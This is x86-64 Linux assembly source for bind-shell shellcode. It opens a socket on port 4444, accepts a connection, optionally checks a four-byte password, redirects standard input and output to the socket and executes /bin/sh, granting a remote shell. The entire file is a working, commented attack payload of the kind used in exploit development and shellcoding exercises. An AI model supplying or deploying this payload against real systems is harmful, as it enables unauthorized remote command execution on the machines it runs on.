BITS 64
global _start
section .text

; settings
;%define     USEPASSWORD     ; comment this to not require password
PASSWORD    equ 'Z~r0'      ; cmp dword (SEGFAULT on fail; no bruteforce/cracking/etc.)
PORT        equ 0x5c11      ; default 4444

; syscall kernel opcodes
SYS_SOCKET  equ 0x29
SYS_BIND    equ 0x31
SYS_LISTEN  equ 0x32
SYS_ACCEPT  equ 0x2b
SYS_DUP2    equ 0x21
SYS_EXECVE  equ 0x3b

; argument constants
AF_INET     equ 0x2
SOCK_STREAM equ 0x1

_start:
; High level psuedo-C overview of shellcode logic:
;
; sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_IP)
; struct sockaddr = {AF_INET; [PORT; 0x0; 0x0]}
;
; bind(sockfd, &sockaddr, 16)
; listen(sockfd, 0)
; client = accept(sockfd, &sockaddr, 16)
; 
; read(client, *pwbuf, 16) /* 16 > 4 */
; if (pwbuf != PASSWORD) goto drop
;
; dup2(client, STDIN+STDOUT+STDERR)
; execve("/bin/sh", NULL, NULL)

create_sock:
    ; sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_IP)

    push   SYS_SOCKET
    pop    rax
    cdq                     ; rdx = IPPROTO_IP (int: 0)
    push   AF_INET
    pop    rdi
    push   SOCK_STREAM
    pop    rsi
    syscall


    ; store sock
    push rax
    pop rdi                 ; rdi = sockfd

struct_sockaddr:    
    ; struct sockaddr = {AF_INET; PORT; 0x0; 0x0}

    push rdx                        ; 0 out the stack for struct
    push rdx

    mov byte [rsp], AF_INET         ; sockaddr.sa_family = AF_INET (u_char)
    mov word [rsp + 0x2], PORT      ; sockaddr.sa_data[] = PORT (short)
    push rsp                        
    pop rsi                         ; rsi = &sockaddr

bind_port:
    ; bind(sockfd, const struct sockaddr *addr, 16)

    push rdx                        ; save 0 for rsi in SYS_LISTEN

    push 0x10                       ; rdx = 16 (sizeof sockaddr)
    pop rdx

    push SYS_BIND
    pop rax
    syscall

server_listen:
    ; listen(sockfd, 0)
    
    pop rsi                 ; backlog = 0 (int)
    mov al, SYS_LISTEN
    syscall

client_accept:
    ; client = accept(sockfd, struct sockaddr *addr, 16)

    mov al, SYS_ACCEPT
    syscall

    ; store client
    push rax
    pop rdi                 ; rdi = client

    ; no need to close parent, save bytes

%ifdef USEPASSWORD
password_check:
    ; password = read(client, *buf, 4)

    push rsp
    pop rsi                         ; rsi = &buf (char*)

                                    ; rdx = 0x10, >4 bytes
    xor eax, eax                    ; SYS_READ = 0x0
    syscall

    cmp dword [rsp], PASSWORD       ; simple comparison
    jne drop                        ; bad pw, abort
%endif

dupe_sockets:
    ; dup2(client, STDIN)
    ; dup2(client, STDOUT)
    ; dup2(client, STERR)
    
    push 0x3                ; loop down file descriptors for I/O
    pop rsi
    
dupe_loop:
    dec esi
    mov al, SYS_DUP2
    syscall
    
    jne dupe_loop

exec_shell:
    ; execve('//bin/sh', NULL, NULL)
    
    push rsi                    ; *argv[] = 0
    pop rdx                     ; *envp[] = 0

    push rsi                    ; '\0'
    mov rdi, '//bin/sh'         ; str
    push rdi            
    push rsp            
    pop rdi                     ; rdi = &str (char*)

    mov al, SYS_EXECVE          ; we fork with this syscall
    syscall

drop:
    ; password check failed, crash program with BADINSTR/SEGFAULT
